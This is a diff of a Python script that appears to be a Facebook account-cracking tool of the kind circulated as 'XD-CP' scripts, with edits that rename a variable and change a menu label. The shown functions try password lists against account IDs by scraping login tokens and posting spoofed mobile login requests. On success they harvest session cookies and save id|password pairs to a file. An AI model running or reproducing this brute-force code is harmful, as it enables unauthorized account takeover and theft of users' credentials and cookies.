@@ -612,7 +612,7 @@ def menu():
 		clear()
 				
 		linex()
-		print('\033[92;1m [2] Best Normal Method ')
+		print('\033[92;1m [1] Best Normal Method ')
 		print('\033[1;37m----------------------------------------------')
 		print('\033[92;1m [2] Best Normal Method ')
 		print('\033[1;37m----------------------------------------------')
@@ -1477,7 +1477,7 @@ def ffb7(ids,names,passlist):
 			getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
 			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
 			complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-			SHAHBAZ=session.cookies.get_dict().keys()
+			AXI=session.cookies.get_dict().keys()
 			if "c_user" in AXI:
 				coki=session.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
@@ -1519,7 +1519,7 @@ def ffb8(ids,names,passlist):
 			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
 			head = {'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="105", "Google Chrome";v="105"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
 			complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-			SHAHBAZ=session.cookies.get_dict().keys()
+			AXI=session.cookies.get_dict().keys()
 			if "c_user" in AXI:
 				print('\r\r\x1b[38;5;208m [GS XD-CP] '+ids+' | '+pas+'\033[1;97m')
 				open('/sdcard/GS XD-CP.txt', 'a').write(ids+'|'+pas+'\n')
